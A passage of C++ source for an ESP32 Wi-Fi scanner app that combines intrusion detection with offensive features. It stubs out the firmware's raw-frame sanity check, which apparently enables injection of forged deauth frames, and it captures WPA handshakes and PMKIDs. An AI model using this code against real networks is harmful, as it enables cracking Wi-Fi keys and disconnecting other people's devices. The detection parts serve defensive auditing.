#include <Tactility/RecursiveMutex.h>
#include <Tactility/Timer.h>
#include <Tactility/app/alertdialog/AlertDialog.h>
#include <Tactility/app/wificonnect/WifiConnect.h>
#include <Tactility/service/music/Music.h>
#include <Tactility/service/neopixel/NeoPixel.h>
#include <Tactility/service/wifi/Wifi.h>

#include <app/event.h>
#include <app/manager.h>
#include <app/manifest.h>
#include <app/scheduler.h>

#include <lvgl_window_manager/window_manager.h>

#include <tactility/check.h>
#include <tactility/log.h>
#include <tactility/drivers/backlight.h>
#include <tactility/drivers/display.h>

extern "C" void romhack_keypad_set_media_cb(void (*cb)(uint32_t, bool));

#include "OuiTable.h"
#include "wids_shield_icon.h"
#include "cyber_home_image.h"

#include <algorithm>
#include <atomic>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <deque>
#include <map>
#include <memory>
#include <string>
#include <vector>

#include <lvgl/lvgl.h>
#include <lvgl/widgets/toolbar.h>

#ifdef ESP_PLATFORM
#include <esp_wifi.h>
#include <esp_timer.h>
#include <esp_netif.h>
#include <esp_mac.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#endif

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
    return 0;
}

#ifdef __cplusplus
}
#endif

namespace tt::app::wifiscanner {

extern const ::AppManifest manifest;

namespace {

constexpr auto* TAG = "WifiScanner";
constexpr uint16_t MAX_RECORDS = 40;
constexpr uint32_t REFRESH_MS = 1000;
constexpr uint32_t ROW_EXPIRY_MS = 20000;

constexpr int MAX_SERIES = 8;
constexpr int CHART_POINTS = 33;
constexpr float BELL_HALF_WIDTH = 2.0f;
constexpr float CH_AXIS_MIN = 0.0f;
constexpr float CH_AXIS_MAX = 14.0f;
constexpr int32_t SIGNAL_FLOOR_DBM = -100;
constexpr int32_t SIGNAL_RANGE_DB = 70;
constexpr uint32_t HOP_INTERVAL_MS = 300;
constexpr int MAX_PROBED_SSIDS = 4;

inline float channelFraction(int channel) {
    return ((float)channel - CH_AXIS_MIN) / (CH_AXIS_MAX - CH_AXIS_MIN);
}

const uint32_t SERIES_COLORS[MAX_SERIES] = {
    0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x00FFFF, 0x0000FF, 0x8000FF, 0xFF00FF,
};

enum class Page { ModuleHome, Graph, WidsGraph, List, Detail, Clients, EvilTwinDetail, WidsDetail, Recon };
enum class RadioMode { Stopped, ActiveScan, Capture };

enum class WidsAttackType : uint8_t {
    None = 0,
    DeauthFlood = 1,
    RogueApClone = 2,
    BeaconSpam = 3,
};

inline const char* widsAttackToString(WidsAttackType type) {
    switch (type) {
        case WidsAttackType::DeauthFlood: return "DEAUTH FLOOD";
        case WidsAttackType::RogueApClone: return "ROGUE AP CLONE";
        case WidsAttackType::BeaconSpam: return "BEACON SPAM";
        default: return "NESSUNA";
    }
}

inline int widsThreatSeverity(WidsAttackType type) {
    switch (type) {
        case WidsAttackType::RogueApClone: return 3;
        case WidsAttackType::DeauthFlood: return 2;
        case WidsAttackType::BeaconSpam: return 1;
        default: return 0;
    }
}

struct WidsEvent {
    uint32_t timestampMs;
    WidsAttackType type;
    char desc[64];
    uint8_t bssid[6];
    int channel;
    uint16_t rate;
};

uint64_t bssidKey(const uint8_t* bssid) {
    uint64_t key = 0;
    for (int i = 0; i < 6; i++) key = (key << 8) | bssid[i];
    return key;
}

uint64_t nowMs() { return (uint64_t)lv_tick_get(); }

enum class PmfState : uint8_t {
    None = 0,       // Assente
    Capable = 1,    // Facoltativo (MFPC=1, MFPR=0)
    Required = 2,   // Obbligatorio (MFPC=1, MFPR=1)
};

const char* pmfToString(PmfState pmf) {
    switch (pmf) {
        case PmfState::Required: return "Obbligatorio (Protetto)";
        case PmfState::Capable:  return "Facoltativo (Compatibilita)";
        case PmfState::None:
        default:                 return "Assente (Vulnerabile Deauth)";
    }
}

struct SeenAp {
    WifiApRecord record{};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t rssiMin = 0;
    int8_t rssiMax = 0;
    bool fromCapture = false;
    uint32_t packetCount = 0;
    int colorIndex = 0;
    PmfState pmf = PmfState::None;
};

constexpr int HS_MAX_APS = 16;
constexpr int HS_FRAME_MAX = 320;
constexpr int HS_BEACON_MAX = 400;

struct HandshakeCapture {
    char ssid[33] = {};
    uint8_t beacon[HS_BEACON_MAX] = {};
    int beaconLen = 0;
    uint8_t eapol[4][HS_FRAME_MAX] = {};
    int eapolLen[4] = {0, 0, 0, 0};
    uint8_t msgMask = 0;
    bool hasPmkid = false;
    bool saved = false;
};

struct CapturedClient {
    uint8_t mac[6] = {};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t lastRssi = 0;
    uint64_t associatedBssid = 0;
    std::vector<std::string> probedSsids;
    uint32_t packetCount = 0;
    uint32_t txCount = 0;
    uint32_t rxCount = 0;
};

struct ModeBadgeGroup {
    lv_obj_t* col = nullptr;
    lv_obj_t* widsBadge = nullptr;
    lv_obj_t* hopBadge = nullptr;
    lv_obj_t* hopLabel = nullptr;
    lv_obj_t* rcnBadge = nullptr;
    lv_obj_t* stopBadge = nullptr;
};

struct Context {
    uint32_t appInstanceId = 0;
    WindowId window = 0;

    RecursiveMutex mutex;
    std::unique_ptr<Timer> timer = nullptr;
    std::unique_ptr<Timer> ledTimer = nullptr;
    std::atomic<bool> vuFeeding{false};
    std::atomic<int> vuLevel{0};
    std::atomic<uint32_t> vuRefreshTick{0};

    Page page = Page::ModuleHome;
    bool widsActive = true;
    bool hopActive = false;
    bool reconActive = true;
    ModeBadgeGroup tacticalModeBadges;
    ModeBadgeGroup widsModeBadges;
    std::map<uint64_t, SeenAp> seen;
    std::map<uint64_t, CapturedClient> clients;
    std::map<uint64_t, HandshakeCapture> handshakes;
    int handshakesSaved = 0;
    int pmkidSeen = 0;
    int deauthBurstsSent = 0;
    bool evilTwinActive = false;
    std::atomic<bool> evilTwinLogging{false};
    std::atomic<uint32_t> deauthDialogId{0};
    std::atomic<uint32_t> clientDeauthDialogId{0};
    std::atomic<uint32_t> pmkidDialogId{0};
    std::atomic<uint32_t> evilTwinDialogId{0};
    std::atomic<uint32_t> reconKarmaDialogId{0};
    uint64_t targetClientKey = 0;
    uint64_t reconTargetClientKey = 0;
    std::string reconTargetSsid;
    std::vector<uint64_t> visible;
    uint64_t selectedKey = 0;
    uint32_t detailBeaconBaseline = 0;
    int detailChannel = 0;
    int nextColor = 0;
    RadioMode mode = RadioMode::Capture;

    bool ledSaved = false;
    service::neopixel::Animation savedAnim = service::neopixel::Animation::Off;
    service::neopixel::ColorMode savedColorMode = service::neopixel::ColorMode::Static;
    uint8_t savedR = 0, savedG = 0, savedB = 0, savedBrightness = 0, savedSpeed = 0;
    bool savedVuActive = false, savedVuDecay = false, savedVuAutoGain = false, savedVuBeatFlash = false, savedVuPeakHold = false;
    service::neopixel::VuPalette savedVuPalette = service::neopixel::VuPalette::Classic;
    service::neopixel::VuOrigin savedVuOrigin = service::neopixel::VuOrigin::BothLeft;
    uint8_t savedVuR = 0, savedVuG = 0, savedVuB = 0, savedVuBrightness = 0, savedVuSensitivity = 0;
    int ledViewApplied = -1;
    int ledColorApplied = -1;

    lv_obj_t* toolbar = nullptr;
    lv_obj_t* statusLabel = nullptr;
    lv_obj_t* modeBadge = nullptr;
    lv_obj_t* modeBadgeLabel = nullptr;
    lv_obj_t* statsLabel = nullptr;
    lv_obj_t* activeChannelIndicator = nullptr;
    lv_obj_t* graphPage = nullptr;
    lv_obj_t* chart = nullptr;
    lv_obj_t* labelLayer = nullptr;
    lv_chart_series_t* series[MAX_SERIES] = {};
    lv_obj_t* scanButton = nullptr;
    lv_obj_t* captureButton = nullptr;
    lv_obj_t* widsButton = nullptr;
    lv_obj_t* stopButton = nullptr;
    lv_obj_t* listPage = nullptr;
    lv_obj_t* list = nullptr;
    std::map<uint64_t, lv_obj_t*> rows;
    lv_obj_t* detailPage = nullptr;
    lv_obj_t* detailScroll = nullptr;
    lv_obj_t* detailClientsButton = nullptr;
    lv_obj_t* detailLockButton = nullptr;
    lv_obj_t* detailDeauthButton = nullptr;
    lv_obj_t* detailPmkidButton = nullptr;
    lv_obj_t* detailEvilTwinButton = nullptr;
    lv_obj_t* detailEvilTwinDetailsButton = nullptr;
    lv_obj_t* detailHsSummary = nullptr;
    lv_obj_t* detailSsidLabel = nullptr;
    lv_obj_t* detailMacLabel = nullptr;
    lv_obj_t* detailSecLabel = nullptr;
    lv_obj_t* detailPmfLabel = nullptr;
    lv_obj_t* detailChanLabel = nullptr;
    lv_obj_t* detailPowerLabel = nullptr;
    lv_obj_t* detailPhyLabel = nullptr;
    lv_obj_t* detailTimeLabel = nullptr;
    lv_obj_t* detailDeauthLabel = nullptr;
    lv_obj_t* connectButton = nullptr;
    lv_obj_t* clientsPage = nullptr;
    lv_obj_t* clientsList = nullptr;
    std::map<uint64_t, lv_obj_t*> clientRows;

    lv_obj_t* etDetailPage = nullptr;
    lv_obj_t* etStatusLabel = nullptr;
    lv_obj_t* etClientsList = nullptr;
    lv_obj_t* etLogToggleButton = nullptr;

    // WIDS Intrusion Detection state & UI
    std::atomic<bool> widsPcapEnabled{false};
    std::atomic<bool> widsLogFileEnabled{true};
    std::atomic<uint32_t> widsDeauthWindowCount{0};
    std::atomic<uint32_t> widsLastDeauthRate{0};
    std::atomic<uint32_t> widsPeakDeauthRate{0};
    uint8_t widsLastAttackedBssid[6] = {};
    int widsLastAttackedChannel = 0;
    std::atomic<uint32_t> widsNewBssidWindowCount{0};
    std::atomic<WidsAttackType> widsActiveThreat{WidsAttackType::None};
    uint32_t widsThreatClearTick = 0;
    std::deque<WidsEvent> widsEvents;
    int widsTotalAttacks = 0;

    // Self-attack filter state & local identity
    bool widsFilterSelf = false;
    uint8_t myStaMac[6] = {};
    uint8_t myApMac[6] = {};
    bool myMacValid = false;
    uint32_t lastLocalAttackTimestampMs = 0;
    uint8_t lastLocalAttackBssid[6] = {};
    int lastLocalAttackChannel = 0;
    WidsAttackType lastLocalAttackType = WidsAttackType::None;

    lv_obj_t* widsDetailPage = nullptr;
    lv_obj_t* widsDetailScroll = nullptr;
    lv_obj_t* widsThreatLabel = nullptr;
    lv_obj_t* widsMetricsLabel = nullptr;
    lv_obj_t* widsPcapButton = nullptr;
    lv_obj_t* widsChannelModeButton = nullptr;
    lv_obj_t* widsFilterSelfButton = nullptr;
    lv_obj_t* widsLogList = nullptr;
    size_t widsLogRenderedCount = (size_t)-1;
    uint32_t widsLogRenderedTime = 0;

    // Module Home UI
    lv_obj_t* moduleHomePage = nullptr;
    lv_obj_t* moduleTacticalCard = nullptr;
    lv_obj_t* moduleSentinelCard = nullptr;
    lv_obj_t* moduleReconCard = nullptr;
    lv_obj_t* homeTacticalApBadge = nullptr;
    lv_obj_t* homeTacticalCliBadge = nullptr;
    lv_obj_t* homeTacticalHsBadge = nullptr;
    lv_obj_t* homeTacticalPmkBadge = nullptr;
    lv_obj_t* homeSentinelBadge = nullptr;
    lv_obj_t* homeSentinelSubBadge = nullptr;
    lv_obj_t* homeReconBadge = nullptr;
    lv_obj_t* homeReconSubBadge = nullptr;
    std::atomic<WidsAttackType> widsMostSevereThreat{WidsAttackType::None};
    uint32_t widsSevereThreatTimestampMs = 0;
    // Smart Statusbar (Persistent across entire app)
    lv_obj_t* smartBar = nullptr;
    lv_obj_t* smartBarTitle = nullptr;
    lv_obj_t* homeStealthBadge = nullptr;
    lv_obj_t* homeStealthCapsule = nullptr;
    lv_obj_t* homeTacChip = nullptr;
    lv_obj_t* homeSntChip = nullptr;
    lv_obj_t* homeRcnChip = nullptr;

    // Recon UI (Probe Hunter)
    lv_obj_t* reconPage = nullptr;
    lv_obj_t* reconList = nullptr;
    lv_obj_t* reconStatsLabel = nullptr;
    lv_obj_t* reconToggleButton = nullptr;
    std::map<uint64_t, lv_obj_t*> reconRows;

    // Sentinel WIDS Graph UI
    lv_obj_t* widsGraphPage = nullptr;
    lv_obj_t* widsChart = nullptr;
    lv_obj_t* widsLabelLayer = nullptr;
    lv_chart_series_t* widsSeries[MAX_SERIES] = {};
    lv_obj_t* widsActiveChannelIndicator = nullptr;
    lv_obj_t* widsModeBadge = nullptr;
    lv_obj_t* widsModeBadgeLabel = nullptr;
    lv_obj_t* widsStatsLabel = nullptr;
    lv_obj_t* widsStartButton = nullptr;
    lv_obj_t* widsStopButton = nullptr;
    lv_obj_t* widsDetailsButton = nullptr;
};

inline WidsAttackType getRecentSevereThreat(Context* ctx) {
    if (ctx == nullptr) return WidsAttackType::None;
    WidsAttackType t = ctx->widsMostSevereThreat.load();
    if (t == WidsAttackType::None) return WidsAttackType::None;
    uint32_t now = lv_tick_get();
    if ((now - ctx->widsSevereThreatTimestampMs) < (5 * 60 * 1000)) {
        return t;
    }
    ctx->widsMostSevereThreat.store(WidsAttackType::None);
    return WidsAttackType::None;
}

void triggerWidsAlert(Context* ctx, WidsAttackType type, const char* desc, const uint8_t* bssid = nullptr, int channel = 0, uint16_t rate = 0);

inline bool isPacketFromMe(Context* ctx, const uint8_t* addr2, const uint8_t* addr3, int channel) {
    if (ctx == nullptr) return false;
    if (ctx->myMacValid) {
        if (addr2 != nullptr && (memcmp(addr2, ctx->myStaMac, 6) == 0 || memcmp(addr2, ctx->myApMac, 6) == 0)) {
            return true;
        }
    }
    static const uint8_t FAKE_CLIENT[6] = {0x02, 0xDE, 0xAD, 0xBE, 0xEF, 0x01};
    if (addr2 != nullptr && memcmp(addr2, FAKE_CLIENT, 6) == 0) {
        return true;
    }
    if (ctx->lastLocalAttackTimestampMs != 0 && (lv_tick_get() - ctx->lastLocalAttackTimestampMs < 5000)) {
        if (channel == ctx->lastLocalAttackChannel && addr3 != nullptr && memcmp(addr3, ctx->lastLocalAttackBssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

inline void recordLocalAttack(Context* ctx, WidsAttackType type, const char* desc, const uint8_t* bssid, int channel, uint16_t rate) {
    if (ctx == nullptr) return;
    ctx->lastLocalAttackTimestampMs = lv_tick_get();
    if (bssid != nullptr) memcpy(ctx->lastLocalAttackBssid, bssid, 6);
    ctx->lastLocalAttackChannel = channel;
    ctx->lastLocalAttackType = type;
    if (!ctx->widsFilterSelf) {
        triggerWidsAlert(ctx, type, desc, bssid, channel, rate);
        if (type == WidsAttackType::DeauthFlood) {
            ctx->widsLastDeauthRate.store(rate);
            if (rate > ctx->widsPeakDeauthRate.load()) ctx->widsPeakDeauthRate.store(rate);
        }
    }
}

#ifdef ESP_PLATFORM

std::atomic<Context*> g_captureCtx{nullptr};
std::atomic<bool> g_captureRunning{false};
std::atomic<bool> g_captureStopped{true};
std::atomic<int> g_hopChannel{1};
std::atomic<int> g_lockChannel{0};

std::string macToString(const uint8_t* mac);

void parseBeaconIes(const uint8_t* ies, int iesLen, uint16_t capability,
    std::string& ssidOut, bool& ssidSeen, WifiAuthenticationType& authOut, PmfState& pmfOut) {
    bool privacy = (capability & 0x0010) != 0;
    bool hasRsn = false;
    bool hasWpa = false;
    bool hasSae = false;
    bool hasPsk = false;
    pmfOut = PmfState::None;
    ssidSeen = false;
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        const uint8_t* data = ies + i + 2;
        if (tag == 0) {
            ssidOut.assign(reinterpret_cast<const char*>(data), len);
            ssidSeen = len > 0;
        } else if (tag == 48) {
            hasRsn = true;
            if (len >= 8) {
                int offset = 6; // skip Version (2) + Group Cipher (4)
                uint16_t pairwise_count = data[offset] | (data[offset + 1] << 8);
                offset += 2 + pairwise_count * 4;
                if (offset + 2 <= len) {
                    uint16_t akm_count = data[offset] | (data[offset + 1] << 8);
                    offset += 2;
                    for (uint16_t k = 0; k < akm_count && offset + 4 <= len; k++, offset += 4) {
                        if (data[offset] == 0x00 && data[offset + 1] == 0x0F && data[offset + 2] == 0xAC) {
                            uint8_t akm_type = data[offset + 3];
                            if (akm_type == 2) hasPsk = true;
                            else if (akm_type == 8 || akm_type == 18) hasSae = true;
                        }
                    }
                    if (offset + 2 <= len) {
                        uint16_t rsn_cap = data[offset] | (data[offset + 1] << 8);
                        bool mfpc = (rsn_cap & (1 << 6)) != 0;
                        bool mfpr = (rsn_cap & (1 << 7)) != 0;
                        if (mfpr) {
                            pmfOut = PmfState::Required;
                        } else if (mfpc) {
                            pmfOut = PmfState::Capable;
                        } else {
                            pmfOut = PmfState::None;
                        }
                    }
                }
            }
        } else if (tag == 221 && len >= 4 && data[0] == 0x00 && data[1] == 0x50 && data[2] == 0xF2 && data[3] == 0x01) {
            hasWpa = true;
        }
        i += 2 + len;
    }
    if (!privacy) {
        authOut = WIFI_AUTHENTICATION_TYPE_OPEN;
        pmfOut = PmfState::None;
    } else if (hasSae && (hasPsk || hasWpa || pmfOut == PmfState::Capable)) {
        authOut = WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK;
    } else if (hasSae) {
        authOut = WIFI_AUTHENTICATION_TYPE_WPA3_PSK;
    } else if (hasRsn && hasWpa) {
        authOut = WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK;
    } else if (hasRsn) {
        authOut = WIFI_AUTHENTICATION_TYPE_WPA2_PSK;
    } else if (hasWpa) {
        authOut = WIFI_AUTHENTICATION_TYPE_WPA_PSK;
    } else {
        authOut = WIFI_AUTHENTICATION_TYPE_WEP;
    }
}

std::string parseProbeRequestSsid(const uint8_t* ies, int iesLen) {
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        if (tag == 0 && len > 0) {
            if (len > 32) len = 32;
            std::string s(reinterpret_cast<const char*>(ies + i + 2), len);
            bool hasPrintable = false;
            for (char& c : s) {
                unsigned char uc = (unsigned char)c;
                if (uc < 0x20 || uc >= 0x7F) {
                    c = ' ';
                } else {
                    hasPrintable = true;
                }
            }
            if (!hasPrintable) return {};
            size_t start = s.find_first_not_of(" \t\r\n");
            size_t end = s.find_last_not_of(" \t\r\n");
            if (start == std::string::npos) return {};
            return s.substr(start, end - start + 1);
        }
        i += 2 + len;
    }
    return {};
}

void sanitizeAscii(char* str) {
    if (!str) return;
    char* r = str;
    char* w = str;
    while (*r) {
        unsigned char c = (unsigned char)*r;
        if (c == 0xC3 && *(r + 1)) {
            unsigned char c2 = (unsigned char)*(r + 1);
            if (c2 >= 0x80 && c2 <= 0x85) *w++ = 'A';
            else if (c2 >= 0xA0 && c2 <= 0xA5) *w++ = 'a';
            else if (c2 >= 0x88 && c2 <= 0x8B) *w++ = 'E';
            else if (c2 >= 0xA8 && c2 <= 0xAB) *w++ = 'e';
            else if (c2 >= 0x8C && c2 <= 0x8F) *w++ = 'I';
            else if (c2 >= 0xAC && c2 <= 0xAF) *w++ = 'i';
            else if (c2 >= 0x92 && c2 <= 0x96) *w++ = 'O';
            else if (c2 >= 0xB2 && c2 <= 0xB6) *w++ = 'o';
            else if (c2 >= 0x99 && c2 <= 0x9C) *w++ = 'U';
            else if (c2 >= 0xB9 && c2 <= 0xBC) *w++ = 'u';
            else if (c2 == 0x87) *w++ = 'C';
            else if (c2 == 0xA7) *w++ = 'c';
            else if (c2 == 0x91) *w++ = 'N';
            else if (c2 == 0xB1) *w++ = 'n';
            else *w++ = '?';
            r += 2;
        } else if (c > 127) {
            *w++ = '?';
            r++;
        } else {
            *w++ = *r++;
        }
    }
    *w = '\0';
}

void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& ssid, bool ssidSeen,
    int channel, int8_t rssi, WifiAuthenticationType auth, PmfState pmf) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    uint64_t now = nowMs();
    auto it = ctx->seen.find(key);
    if (it == ctx->seen.end()) {
        SeenAp ap{};
        memcpy(ap.record.bssid, bssid, 6);
        if (ssidSeen) {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
            sanitizeAscii(ap.record.ssid);
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.record.authentication_type = auth;
        ap.record.pairwise_cipher = WIFI_AP_CIPHER_UNKNOWN;
        ap.firstSeenMs = now;
        ap.lastSeenMs = now;
        ap.rssiMin = ap.rssiMax = rssi;
        ap.fromCapture = true;
        ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
        ap.packetCount = 1;
        ap.pmf = pmf;
        ctx->seen.emplace(key, ap);
        ctx->widsNewBssidWindowCount.fetch_add(1);

        // Check for Rogue AP clone (same SSID, different BSSID, differing security or channel)
        if (ssidSeen && !ssid.empty()) {
            for (const auto& [k, existingAp] : ctx->seen) {
                if (k != key && existingAp.record.ssid[0] != '\0' &&
                    ssid == existingAp.record.ssid &&
                    (existingAp.record.authentication_type != auth || existingAp.record.channel != channel)) {
                    bool fromMe = isPacketFromMe(ctx, bssid, bssid, channel);
                    if (!ctx->widsFilterSelf || !fromMe) {
                        char alertMsg[64];
                        snprintf(alertMsg, sizeof(alertMsg), "Rogue AP clonato: %s", ssid.c_str());
                        triggerWidsAlert(ctx, WidsAttackType::RogueApClone, alertMsg, bssid, channel, 1);
                        break;
                    }
                }
            }
        }
    } else {
        SeenAp& ap = it->second;
        if (ssidSeen && ap.record.ssid[0] == '\0') {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
            sanitizeAscii(ap.record.ssid);
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.lastSeenMs = now;
        ap.packetCount++;
        ap.rssiMin = std::min(ap.rssiMin, rssi);
        ap.rssiMax = std::max(ap.rssiMax, rssi);
        if (ap.fromCapture) ap.record.authentication_type = auth;
        ap.pmf = pmf;
    }
    ctx->mutex.unlock();
}

void upsertClientProbe(Context* ctx, const uint8_t* mac, const std::string& probedSsid, int8_t rssi) {
    if (!ctx->reconActive) return;
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.packetCount++;
    if (!probedSsid.empty() &&
        std::find(client.probedSsids.begin(), client.probedSsids.end(), probedSsid) == client.probedSsids.end() &&
        client.probedSsids.size() < MAX_PROBED_SSIDS) {
        client.probedSsids.push_back(probedSsid);
    }
    ctx->mutex.unlock();
}

void upsertClientAssociation(Context* ctx, const uint8_t* mac, const uint8_t* bssid, int8_t rssi, bool clientSent) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.associatedBssid = bssidKey(bssid);
    client.packetCount++;
    if (clientSent) client.txCount++; else client.rxCount++;
    ctx->mutex.unlock();
}

void storeBeaconForHandshake(Context* ctx, const uint8_t* bssid, const uint8_t* frame, int len, const std::string& ssid) {
    if (!ctx->mutex.lock(0)) return;
    auto it = ctx->handshakes.find(bssidKey(bssid));
    if (it != ctx->handshakes.end() && it->second.beaconLen == 0) {
        int n = std::min(len, HS_BEACON_MAX);
        memcpy(it->second.beacon, frame, n);
        it->second.beaconLen = n;
        if (!ssid.empty() && it->second.ssid[0] == '\0') {
            size_t s = std::min(ssid.size(), sizeof(it->second.ssid) - 1);
            memcpy(it->second.ssid, ssid.data(), s);
            it->second.ssid[s] = '\0';
        }
    }
    ctx->mutex.unlock();
}

void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2) {
    int hdr = 24;
    if (subtype & 0x08) hdr += 2;
    if (len < hdr + 8 + 7) return;
    const uint8_t* llc = payload + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return;
    if (((llc[6] << 8) | llc[7]) != 0x888E) return;
    const uint8_t* eapol = llc + 8;
    int eapolLen = len - hdr - 8;
    if (eapolLen < 7 || eapol[1] != 0x03) return;
    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool mic = keyInfo & 0x0100, ack = keyInfo & 0x0080, install = keyInfo & 0x0040, secure = keyInfo & 0x0200;
    int slot;
    if (ack && !mic) slot = 0;
    else if (mic && !ack && !secure) slot = 1;
    else if (ack && mic && install) slot = 2;
    else if (mic && !ack && secure) slot = 3;
    else return;
    const uint8_t* bssid = (slot == 0 || slot == 2) ? addr2 : addr1;

    bool pmkid = false;
    if (slot == 0) {
        for (int i = 0; i + 6 <= eapolLen; i++) {
            if (eapol[i] == 0xDD && eapol[i + 2] == 0x00 && eapol[i + 3] == 0x0F &&
                eapol[i + 4] == 0xAC && eapol[i + 5] == 0x04) { pmkid = true; break; }
        }
    }

    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    auto it = ctx->handshakes.find(key);
    if (it == ctx->handshakes.end()) {
        if ((int)ctx->handshakes.size() >= HS_MAX_APS) { ctx->mutex.unlock(); return; }
        it = ctx->handshakes.emplace(key, HandshakeCapture{}).first;
        auto sit = ctx->seen.find(key);
        if (sit != ctx->seen.end()) {
            strncpy(it->second.ssid, sit->second.record.ssid, sizeof(it->second.ssid) - 1);
        }
    }
    HandshakeCapture& hc = it->second;
    if (hc.eapolLen[slot] == 0) {
        int n = std::min(len, HS_FRAME_MAX);
        memcpy(hc.eapol[slot], payload, n);
        hc.eapolLen[slot] = n;
        hc.msgMask |= (uint8_t)(1 << slot);
        hc.saved = false;
    }
    if (pmkid && !hc.hasPmkid) { hc.hasPmkid = true; ctx->pmkidSeen++; }
    ctx->mutex.unlock();
}

void logEvilTwinPacket(const uint8_t* payload, int len);
void logWidsPacket(const uint8_t* payload, int len);

void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    Context* ctx = g_captureCtx.load();
    if (ctx == nullptr) return;

    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int rawLen = pkt->rx_ctrl.sig_len;
    if (rawLen < 28) return;
    int len = rawLen - 4;

    if (ctx->evilTwinLogging.load()) {
        logEvilTwinPacket(payload, len);
    }
    if (ctx->widsPcapEnabled.load()) {
        logWidsPacket(payload, len);
    }

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frameType = (fc >> 2) & 0x3;
    uint8_t frameSubtype = (fc >> 4) & 0xF;
    bool toDs = (fc & 0x0100) != 0;
    bool fromDs = (fc & 0x0200) != 0;
    const uint8_t* addr1 = payload + 4;
    const uint8_t* addr2 = payload + 10;
    const uint8_t* addr3 = payload + 16;
    int8_t rssi = pkt->rx_ctrl.rssi;
    int channel = pkt->rx_ctrl.channel;

    if (frameType == 0) {
        if (frameSubtype == 12 || frameSubtype == 10) { // Deauth (12) o Disassoc (10)
            bool fromMe = isPacketFromMe(ctx, addr2, addr3, channel);
            if (!ctx->widsFilterSelf || !fromMe) {
                ctx->widsDeauthWindowCount.fetch_add(1);
                memcpy(ctx->widsLastAttackedBssid, addr3, 6);
                ctx->widsLastAttackedChannel = channel;
            }
        } else if ((frameSubtype == 8 || frameSubtype == 5) && len >= 24 + 12) {
            uint16_t capability = payload[24 + 10] | (payload[24 + 11] << 8);
            std::string ssid;
            bool ssidSeen = false;
            WifiAuthenticationType auth = WIFI_AUTHENTICATION_TYPE_OPEN;
            PmfState pmf = PmfState::None;
            parseBeaconIes(payload + 24 + 12, len - 24 - 12, capability, ssid, ssidSeen, auth, pmf);
            upsertApFromCapture(ctx, addr3, ssid, ssidSeen, channel, rssi, auth, pmf);
            storeBeaconForHandshake(ctx, addr3, payload, len, ssid);
        } else if (frameSubtype == 4) {
            std::string ssid = parseProbeRequestSsid(payload + 24, len - 24);
            upsertClientProbe(ctx, addr2, ssid, rssi);
        }
    } else if (frameType == 2) {
        if (toDs && !fromDs) {
            upsertClientAssociation(ctx, addr2, addr1, rssi, true);
        } else if (!toDs && fromDs) {
            upsertClientAssociation(ctx, addr1, addr2, rssi, false);
        }
        handleEapol(ctx, payload, len, frameSubtype, addr1, addr2);
    }
}

constexpr int HOP_SEQUENCE[] = {1, 6, 11, 3, 8, 13, 2, 7, 1, 6, 11, 4, 9, 5, 10, 12};
constexpr int HOP_SEQUENCE_LEN = sizeof(HOP_SEQUENCE) / sizeof(HOP_SEQUENCE[0]);

int32_t hopTask(void* /*arg*/) {
#ifdef ESP_PLATFORM
    wifi_country_t country = {
        .cc = "IT",
        .schan = 1,
        .nchan = 13,
        .max_tx_power = 20,
        .policy = WIFI_COUNTRY_POLICY_MANUAL
    };
    esp_wifi_set_country(&country);
#endif
    esp_wifi_set_promiscuous_rx_cb(&onPromiscuousPacket);
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    int i = 0;
    while (g_captureRunning.load()) {
        int lock = g_lockChannel.load();
        int channel;
        if (lock >= 1 && lock <= 13) {
            channel = lock;
        } else {
            channel = HOP_SEQUENCE[i];
            i = (i + 1) % HOP_SEQUENCE_LEN;
